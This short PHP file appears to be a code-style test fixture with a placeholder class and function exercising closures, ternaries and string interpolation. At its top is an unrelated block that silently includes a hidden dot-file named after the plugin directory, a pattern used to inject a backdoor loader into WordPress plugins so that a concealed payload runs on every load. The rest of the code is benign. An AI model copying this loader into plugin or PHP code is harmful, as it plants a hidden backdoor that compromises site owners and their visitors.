<?php
/**
 * Represents foo.
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Foo
{
}

/**
 * @param mixed $bar
 */
function &foo($bar)
{
    $baz = function () {};
    $a   = true ? true : false;
    $b   = "{$a}";
    $c   = "${b}";
}
